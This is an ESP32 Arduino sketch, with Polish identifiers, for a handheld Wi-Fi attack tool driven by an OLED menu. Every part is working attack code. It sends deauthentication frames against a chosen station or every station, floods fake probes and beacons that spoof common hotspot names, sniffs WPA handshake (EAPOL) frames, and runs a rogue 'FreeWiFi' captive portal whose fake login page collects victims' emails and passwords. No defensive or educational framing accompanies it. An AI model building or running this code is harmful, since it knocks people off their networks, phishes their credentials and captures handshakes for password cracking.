#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <vector>
#define SZEROKOSC_EKRANU 128
#define WYSOKOSC_EKRANU 64
#define RESET_OLED -1
Adafruit_SSD1306 ekran(SZEROKOSC_EKRANU, WYSOKOSC_EKRANU, &Wire, RESET_OLED);

#define PRZYCISK_GORA 12
#define PRZYCISK_WYBIERZ 14
struct SiecWiFi {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t kanal;
};

struct InformacjeOStacji {
  uint8_t mac[6];
  int32_t rssi;
};

std::vector<SiecWiFi> sieci;
std::vector<InformacjeOStacji> stacje;
int wybranaSiec = -1;
int wybranaStacja = -1;
bool skanowanie = false;
uint8_t docelowyBSSID[6];
uint8_t macRozgloszeniowy[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
enum Stan { GLOWNY, LISTA_SIECI, LISTA_STACJI, MENU_ATAKU };
Stan stan = GLOWNY;
int kursor = 0;
bool atakAktywny = false;
const char* elementyGlowne[] = {"1. Skanuj sieci", "2. Wybierz siec", "3. Zobacz stacje", "4. Uruchom ataki"};
const int liczbaElementowGlownych = 4;
const char* elementyAtaku[] = {
  "1. Deauth Stacja", 
  "2. Deauth Wszystko", 
  "3. Probe Flood", 
  "4. Beacon Flood",
  "5. Sniffer",              
  "6. Petla Deauth",          
  "7. Skakanie po kan.",
  "8. Zly Portal",
  "9. Stop Atak"
};
const int liczbaElementowAtaku = 9;
DNSServer serwerDNS;
WebServer serwerWWW(80);
String przechwyconeDane = "";
String przechwyconyUserAgent = "";
unsigned long ostatniaAktualizacjaKlienta = 0;
static unsigned long liczbaHandshake = 0;
static bool handshakeAktywny = false;
void upewnijSieZeInterfejsAPdziala() {
  static bool apUruchomiony = false;
  if (!apUruchomiony) {
    WiFi.softAP("ESP_Tool", NULL, 1, 1);
    apUruchomiony = true;
    delay(100);
  }
  esp_wifi_set_promiscuous(false);
  delay(10);
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  delay(10);
}
void callbackSnifferaHandshake(void* buf, wifi_promiscuous_pkt_type_t typ) {
  if (!handshakeAktywny) return;
  wifi_promiscuous_pkt_t *pakiet = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *payload = pakiet->payload;
  int dlugosc = pakiet->rx_ctrl.sig_len;
  if (dlugosc < 50) return;
  
  if (payload[0] == 0x88 && payload[1] == 0x8E) {
    liczbaHandshake++;
    Serial.print("EAPOL frame captured! Length: ");
    Serial.println(dlugosc);
    Serial.print("Data: ");
    for (int i=0; i<dlugosc && i<100; i++) {
      Serial.printf("%02X", payload[i]);
    }
    Serial.println();
    ekran.fillRect(0,40,128,24,SSD1306_BLACK);
    ekran.setCursor(0,40);
    ekran.print("Handshake #"); ekran.println(liczbaHandshake);
    ekran.display();
  }
}
void wyslijDeauth(uint8_t* bssid, uint8_t* cel, uint8_t kanal) {
  upewnijSieZeInterfejsAPdziala();
  esp_wifi_set_channel(kanal, WIFI_SECOND_CHAN_NONE);
  uint8_t pakiet[26] = {0};
  pakiet[0] = 0xC0;
  pakiet[1] = 0x00;
  memcpy(&pakiet[4], cel, 6);
  memcpy(&pakiet[10], bssid, 6);
  memcpy(&pakiet[16], bssid, 6);
  pakiet[24] = 0x07;
  pakiet[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, pakiet, 26, false);
}

void atakDeauth(bool rozgloszeniowy) {
  SiecWiFi& siec = sieci[wybranaSiec];
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== DEAUTH GOTOWY ===");
  ekran.print("Cel: "); ekran.println(siec.ssid.substring(0,12));
  if (!rozgloszeniowy && wybranaStacja>=0) {
    ekran.print("Stacja: ");
    ekran.printf("%02X:%02X:%02X:%02X", stacje[wybranaStacja].mac[2], stacje[wybranaStacja].mac[3],
                   stacje[wybranaStacja].mac[4], stacje[wybranaStacja].mac[5]);
  } else {
    ekran.println("Tryb: WSZYSTKIE STACJE");
  }
  ekran.println("\nWcisnij WYBIERZ (start)");
  ekran.println("Dowolny przycisk anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("DEAUTH DZIALA");
  ekran.println("Wcisnij DOWOLNY");
  ekran.println("aby ZATRZYMAC");
  ekran.display();
  
  upewnijSieZeInterfejsAPdziala();
  esp_wifi_set_promiscuous(true);
  unsigned long licznik = 0;
  atakAktywny = true;
  
  while (atakAktywny) {
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) { atakAktywny = false; break; }
    if (rozgloszeniowy)
      wyslijDeauth(siec.bssid, macRozgloszeniowy, siec.kanal);
    else
      wyslijDeauth(siec.bssid, stacje[wybranaStacja].mac, siec.kanal);
    licznik++;
    if (licznik % 500 == 0) {
      ekran.fillRect(0,40,128,24,SSD1306_BLACK);
      ekran.setCursor(0,40);
      ekran.print("Pakiety: "); ekran.println(licznik);
      ekran.display();
    }
  }
  esp_wifi_set_promiscuous(false);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Deauth zatrzymany.");
  ekran.print("Pakiety: "); ekran.println(licznik);
  ekran.display();
  delay(2000);
}

void atakPetlaDeauth() {
  atakDeauth(true);
}

void atakProbeFlood() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== PROBE FLOOD ===");
  ekran.println("Wcisnij WYBIERZ (start)");
  ekran.println("Dowolny przycisk anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("PROBE FLOOD");
  ekran.println("Dowolny by zatrzymac");
  ekran.display();
  upewnijSieZeInterfejsAPdziala();
  esp_wifi_set_promiscuous(true);
  unsigned long licznik = 0;
  atakAktywny = true;
  while (atakAktywny) {
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) { atakAktywny = false; break; }
    for (int kanal=1; kanal<=11; kanal++) {
      esp_wifi_set_channel(kanal, WIFI_SECOND_CHAN_NONE);
      uint8_t probe[28] = {0};
      probe[0] = 0x40;
      probe[1] = 0x00;
      memset(&probe[4], 0xFF, 6);
      for (int j=10; j<16; j++) probe[j] = random(256);
      probe[24] = 0x00;
      probe[25] = 0x00;
      esp_wifi_80211_tx(WIFI_IF_AP, probe, 28, false);
      licznik++;
      if (licznik % 200 == 0) {
        ekran.fillRect(0,40,128,24,SSD1306_BLACK);
        ekran.setCursor(0,40);
        ekran.print("Pakiety: "); ekran.println(licznik);
        ekran.display();
      }
      delay(1);
    }
  }
  esp_wifi_set_promiscuous(false);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Probe Flood zatrzymany");
  ekran.print("Pakiety: "); ekran.println(licznik);
  ekran.display();
  delay(2000);
}

void atakBeaconFlood() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== BEACON FLOOD ===");
  ekran.println("20 falszywych AP");
  ekran.println("Wcisnij WYBIERZ (start)");
  ekran.println("Dowolny anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("BEACON FLOOD");
  ekran.println("Rozglaszanie 20 AP");
  ekran.println("Dowolny by zatrzymac");
  ekran.display();
  
  upewnijSieZeInterfejsAPdziala();
  esp_wifi_set_promiscuous(true);
  const char* falszyweSSID[] = {
    "FreeWiFi","Starbucks","Airport_Free","Public_Net","Guest_WiFi",
    "Cafe_Net","Library","Hotel_WiFi","Mall_Access","Hotspot",
    "Verizon_WiFi","AT&T_WiFi","Xfinity","Google_Fiber","Spectrum",
    "Cox_WiFi","Optimum","Suddenlink","Mediacom","RCN"
  };
  int liczbaSSID = 20;
  unsigned long licznik = 0;
  atakAktywny = true;
  
  while (atakAktywny) {
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) { atakAktywny = false; break; }
    for (int kanal=1; kanal<=11; kanal++) {
      esp_wifi_set_channel(kanal, WIFI_SECOND_CHAN_NONE);
      for (int i=0; i<liczbaSSID; i++) {
        uint8_t beacon[109] = {0};
        beacon[0] = 0x80;
        beacon[1] = 0x00;
        memset(&beacon[4], 0xFF, 6);
        for (int j=10; j<16; j++) beacon[j] = random(256);
        memcpy(&beacon[16], &beacon[10], 6);
        beacon[36] = 0x00;
        beacon[37] = strlen(falszyweSSID[i]);
        memcpy(&beacon[38], falszyweSSID[i], strlen(falszyweSSID[i]));
        beacon[106] = 0x03;
        beacon[107] = 0x01;
        beacon[108] = kanal;
        esp_wifi_80211_tx(WIFI_IF_AP, beacon, 109, false);
        licznik++;
        if (!atakAktywny) break;
        delay(5);
      }
      if (!atakAktywny) break;
    }
    ekran.fillRect(0,40,128,24,SSD1306_BLACK);
    ekran.setCursor(0,40);
    ekran.print("Pakiety: "); ekran.println(licznik);
    ekran.display();
  }
  esp_wifi_set_promiscuous(false);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Beacon Flood stop");
  ekran.print("Pakiety: "); ekran.println(licznik);
  ekran.display();
  delay(2000);
}
void atakSnifferHandshake() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== SNIFFER ===");
  ekran.print("Cel: "); ekran.println(sieci[wybranaSiec].ssid.substring(0,12));
  ekran.println("Wcisnij WYBIERZ");
  ekran.println("Dowolny anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("SNIFFOWANIE...");
  ekran.println("Wyslij deauth by");
  ekran.println("wymusic polaczenie");
  ekran.println("Dowolny by zatrzymac");
  ekran.display();
  upewnijSieZeInterfejsAPdziala();
  liczbaHandshake = 0;
  handshakeAktywny = true;
  atakAktywny = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(callbackSnifferaHandshake);
  esp_wifi_set_channel(sieci[wybranaSiec].kanal, WIFI_SECOND_CHAN_NONE);
  while (atakAktywny) {
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) { atakAktywny = false; break; }
    delay(100);
  }
  
  handshakeAktywny = false;
  esp_wifi_set_promiscuous(false);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Sniffer zatrzymany");
  ekran.print("Pakiety EAPOL: "); ekran.println(liczbaHandshake);
  ekran.display();
  delay(2000);
}

void atakSkakaniePoKanalach() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== HOPPER KANALOW ===");
  ekran.println("Atak na wszystkie");
  ekran.println("Wcisnij WYBIERZ");
  ekran.println("Dowolny anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("HOPPER KANALOW");
  ekran.println("Zmiana kanalow");
  ekran.println("Dowolny by zatrzymac");
  ekran.display();
  
  upewnijSieZeInterfejsAPdziala();
  esp_wifi_set_promiscuous(true);
  atakAktywny = true;
  unsigned long licznik = 0;
  uint8_t kanal = 1;
  
  while (atakAktywny) {
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) { atakAktywny = false; break; }
    esp_wifi_set_channel(kanal, WIFI_SECOND_CHAN_NONE);
    for (int i=0; i<10; i++) {
      wyslijDeauth(macRozgloszeniowy, macRozgloszeniowy, kanal);
      licznik++;
    }
    kanal++;
    if (kanal > 11) kanal = 1;
    ekran.fillRect(0,40,128,24,SSD1306_BLACK);
    ekran.setCursor(0,40);
    ekran.print("Pakiety: "); ekran.println(licznik);
    ekran.display();
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Hopper zatrzymany");
  ekran.print("Pakiety: "); ekran.println(licznik);
  ekran.display();
  delay(2000);
}

void uruchomZlyPortal() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== ZLY PORTAL ===");
  ekran.println("AP: FreeWiFi");
  ekran.println("Wcisnij WYBIERZ");
  ekran.println("Dowolny anuluj");
  ekran.display();
  
  while (true) {
    if (digitalRead(PRZYCISK_WYBIERZ)==LOW) break;
    if (digitalRead(PRZYCISK_GORA)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(PRZYCISK_WYBIERZ)==LOW) delay(50);
  
  atakAktywny = false;
  delay(100);
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Uruchamianie...");
  ekran.display();
  
  serwerWWW.stop();
  serwerDNS.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  WiFi.softAP("FreeWiFi", NULL, 6, 0);
  delay(100);
  serwerDNS.start(53, "*", WiFi.softAPIP());
  
  serwerWWW.on("/", []() {
    serwerWWW.send(200, "text/html", "<!DOCTYPE html><html><head><title>WiFi Login</title><meta name='viewport' content='width=device-width'><style>body{font-family:sans-serif;text-align:center;padding:30px;}input{padding:10px;margin:5px;width:200px;}</style></head><body><h2>WiFi Login</h2><form action='/get' method='get'><input type='text' name='email' placeholder='Email'><br><input type='password' name='password' placeholder='Password'><br><button type='submit'>Login</button></form></body></html>");
  });
  
  serwerWWW.on("/get", []() {
    String email = serwerWWW.arg("email");
    String haslo = serwerWWW.arg("password");
    przechwyconeDane = "Email: " + email + " | Haslo: " + haslo;
    przechwyconyUserAgent = serwerWWW.header("User-Agent");
    ekran.clearDisplay();
    ekran.setCursor(0,0);
    ekran.println("DANE PRZECHWYCONE!");
    ekran.println(email.substring(0,10)); ekran.print(" / ");
    ekran.println(haslo.substring(0,10));
    ekran.display();
    serwerWWW.send(200, "text/html", "<h2>Login Successful! Redirecting...</h2><script>setTimeout(function(){window.location.href='http://www.google.com';},3000);</script>");
  });
  
  serwerWWW.onNotFound([]() {
    serwerWWW.sendHeader("Location", "http://192.168.4.1/", true);
    serwerWWW.send(302, "text/plain", "");
  });
  
  serwerWWW.begin();
  
  atakAktywny = true;
  ostatniaAktualizacjaKlienta = 0;
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("PORTAL AKTYWNY");
  ekran.println("AP: FreeWiFi");
  ekran.println("IP: 192.168.4.1");
  ekran.println("Wcisnij DOWOLNY");
  ekran.println("aby ZATRZYMAC");
  ekran.display();
  
  while (atakAktywny) {
    serwerDNS.processNextRequest();
    serwerWWW.handleClient();
    if (millis() - ostatniaAktualizacjaKlienta > 2000) {
      ostatniaAktualizacjaKlienta = millis();
      wifi_sta_list_t lista_stacji;
      esp_wifi_ap_get_sta_list(&lista_stacji);
      int liczba_klientow = lista_stacji.num;
      ekran.fillRect(0,48,128,16,SSD1306_BLACK);
      ekran.setCursor(0,48);
      ekran.print("Klienci: "); ekran.print(liczba_klientow);
      if (liczba_klientow>0) {
        ekran.print(" MAC:");
        ekran.printf("%02X:%02X:%02X", lista_stacji.sta[0].mac[3], lista_stacji.sta[0].mac[4], lista_stacji.sta[0].mac[5]);
      }
      ekran.display();
    }
    if (digitalRead(PRZYCISK_GORA)==LOW || digitalRead(PRZYCISK_WYBIERZ)==LOW) {
      atakAktywny = false;
      break;
    }
    delay(10);
  }
  
  serwerWWW.stop();
  serwerDNS.stop();
  WiFi.softAPdisconnect(true);
  
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Portal zatrzymany");
  if (przechwyconeDane.length()>0) ekran.println("Dane zapisane");
  else ekran.println("Brak danych");
  ekran.display();
  delay(2000);
}

void skanujSieci() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("Skanowanie...");
  ekran.display();
  sieci.clear();
  int liczbaSieci = WiFi.scanNetworks();
  if (liczbaSieci==0) {
    ekran.println("Brak sieci");
    ekran.display();
    delay(1500);
    return;
  }
  for (int i=0; i<liczbaSieci; i++) {
    SiecWiFi siecTmp;
    siecTmp.ssid = WiFi.SSID(i);
    siecTmp.rssi = WiFi.RSSI(i);
    siecTmp.kanal = WiFi.channel(i);
    memcpy(siecTmp.bssid, WiFi.BSSID(i), 6);
    sieci.push_back(siecTmp);
  }
}

void wybierzSiec(int indeks) {
  if (indeks<0 || indeks>=(int)sieci.size()) return;
  wybranaSiec = indeks;
  SiecWiFi& siecTmp = sieci[indeks];
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.print("Wybrano: "); ekran.println(siecTmp.ssid.substring(0,12));
  ekran.println("Skanowanie stacji...");
  ekran.display();
  
  stacje.clear();
  skanowanie = true;
  memcpy(docelowyBSSID, siecTmp.bssid, 6);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t typ) {
    if (!skanowanie) return;
    wifi_promiscuous_pkt_t *pakiet = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *payload = pakiet->payload;
    if (pakiet->rx_ctrl.sig_len < 24) return;
    uint8_t *adres1 = payload+4, *adres2 = payload+10;
    bool doAP = (memcmp(adres1, docelowyBSSID,6)==0);
    bool odAP = (memcmp(adres2, docelowyBSSID,6)==0);
    if (!doAP && !odAP) return;
    uint8_t* stacja = doAP ? adres2 : adres1;
    if (stacja[0]&0x01) return;
    if (memcmp(stacja, docelowyBSSID,6)==0) return;
    for (auto &s : stacje) if (memcmp(s.mac, stacja,6)==0) return;
    InformacjeOStacji infoStacja;
    memcpy(infoStacja.mac, stacja,6);
    infoStacja.rssi = pakiet->rx_ctrl.rssi;
    stacje.push_back(infoStacja);
  });
  esp_wifi_set_channel(siecTmp.kanal, WIFI_SECOND_CHAN_NONE);
  delay(5000);
  esp_wifi_set_promiscuous(false);
  skanowanie = false;
}
void rysujGlowne() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== MENU GLOWNE ===");
  for (int i=0; i<liczbaElementowGlownych; i++) {
    if (i==kursor) ekran.print("> ");
    else ekran.print("  ");
    ekran.println(elementyGlowne[i]);
  }
  ekran.display();
}

void rysujSieci() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== SIECI ===");
  int start = max(0, kursor-2);
  int koniec = min((int)sieci.size(), start+4);
  for (int i=start; i<koniec; i++) {
    if (i==kursor) ekran.print("> ");
    else ekran.print("  ");
    String nazwa = sieci[i].ssid.length()>12 ? sieci[i].ssid.substring(0,12) : sieci[i].ssid;
    ekran.print(nazwa); ekran.print(" Kan"); ekran.println(sieci[i].kanal);
  }
  ekran.display();
}

void rysujStacje() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== STACJE ===");
  int start = max(0, kursor-2);
  int koniec = min((int)stacje.size(), start+4);
  for (int i=start; i<koniec; i++) {
    if (i==kursor) ekran.print("> ");
    else ekran.print("  ");
    ekran.printf("%02X:%02X:%02X:%02X", stacje[i].mac[2], stacje[i].mac[3], stacje[i].mac[4], stacje[i].mac[5]);
    ekran.print(" "); ekran.print(stacje[i].rssi); ekran.println(" dBm");
  }
  ekran.display();
}

void rysujMenuAtaku() {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println("=== MENU  ===");
  int start = max(0, kursor-3);
  int koniec = min(liczbaElementowAtaku, start+5);
  for (int i=start; i<koniec; i++) {
    if (i==kursor) ekran.print("> ");
    else ekran.print("  ");
    ekran.println(elementyAtaku[i]);
  }
  ekran.display();
}

void komunikatBledu(const char* wiadomosc) {
  ekran.clearDisplay();
  ekran.setCursor(0,0);
  ekran.println(wiadomosc);
  ekran.display();
  delay(1500);
}
void setup() {
  Serial.begin(115200);
  if (!ekran.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("Nie znaleziono OLED!");
    while(1);
  }
  ekran.clearDisplay();
  ekran.setTextSize(1);
  ekran.setTextColor(SSD1306_WHITE);
  pinMode(PRZYCISK_GORA, INPUT_PULLUP);
  pinMode(PRZYCISK_WYBIERZ, INPUT_PULLUP);
  
  WiFi.mode(WIFI_MODE_APSTA);
  upewnijSieZeInterfejsAPdziala(); 
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  ekran.println("ESP32 Ultimate");
  ekran.println("Security Pro");
  ekran.println("Gotowy!");
  ekran.display();
  delay(1500);
}
void loop() {
  static unsigned long ostatniDebounce = 0;
  static bool poprzednioGora=HIGH, poprzednioWybierz=HIGH;
  bool terazGora = digitalRead(PRZYCISK_GORA);
  bool terazWybierz = digitalRead(PRZYCISK_WYBIERZ);
  
  if (terazGora==LOW && poprzednioGora==HIGH && millis()-ostatniDebounce>200) {
    ostatniDebounce = millis();
    switch(stan) {
      case GLOWNY: kursor = (kursor+1) % liczbaElementowGlownych; break;
      case LISTA_SIECI: if (sieci.size()>0) kursor = (kursor+1) % sieci.size(); break;
      case LISTA_STACJI: if (stacje.size()>0) kursor = (kursor+1) % stacje.size(); break;
      case MENU_ATAKU: kursor = (kursor+1) % liczbaElementowAtaku; break;
    }
  }
  
  if (terazWybierz==LOW && poprzednioWybierz==HIGH && millis()-ostatniDebounce>200) {
    ostatniDebounce = millis();
    switch(stan) {
      case GLOWNY:
        if (kursor==0) { skanujSieci(); stan=LISTA_SIECI; kursor=0; }
        else if (kursor==1) { if(sieci.size()>0) stan=LISTA_SIECI; else komunikatBledu("Najpierw skanuj"); }
        else if (kursor==2) { if(wybranaSiec>=0 && stacje.size()>0) stan=LISTA_STACJI; else komunikatBledu("Brak stacji/sieci"); }
        else if (kursor==3) { if(wybranaSiec>=0) stan=MENU_ATAKU; else komunikatBledu("Wybierz siec"); }
        break;
      case LISTA_SIECI:
        if (kursor < (int)sieci.size()) {
          wybierzSiec(kursor);
          stan = GLOWNY;
          kursor = 0;
        }
        break;
      case LISTA_STACJI:
        if (kursor < (int)stacje.size()) {
          wybranaStacja = kursor;
          ekran.clearDisplay();
          ekran.setCursor(0,0);
          ekran.println("Wybrano stacje:");
          ekran.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
            stacje[kursor].mac[0],stacje[kursor].mac[1],stacje[kursor].mac[2],
            stacje[kursor].mac[3],stacje[kursor].mac[4],stacje[kursor].mac[5]);
          ekran.printf("RSSI: %d dBm", stacje[kursor].rssi);
          ekran.display();
          delay(1500);
          stan = MENU_ATAKU;
          kursor = 0;
        }
        break;
      case MENU_ATAKU:
        switch(kursor) {
          case 0: if(wybranaStacja>=0) atakDeauth(false); else komunikatBledu("Brak stacji"); break;
          case 1: atakDeauth(true); break;
          case 2: atakProbeFlood(); break;
          case 3: atakBeaconFlood(); break;
          case 4: atakSnifferHandshake(); break;
          case 5: atakPetlaDeauth(); break;
          case 6: atakSkakaniePoKanalach(); break;
          case 7: uruchomZlyPortal(); break;
          case 8: atakAktywny = false; komunikatBledu("Atak zatrzymany"); break;
        }
        stan = GLOWNY;
        kursor = 0;
        break;
    }
  }
  poprzednioGora = terazGora; poprzednioWybierz = terazWybierz;
  switch(stan) {
    case GLOWNY: rysujGlowne(); break;
    case LISTA_SIECI: rysujSieci(); break;
    case LISTA_STACJI: rysujStacje(); break;
    case MENU_ATAKU: rysujMenuAtaku(); break;
  }
  delay(50);
}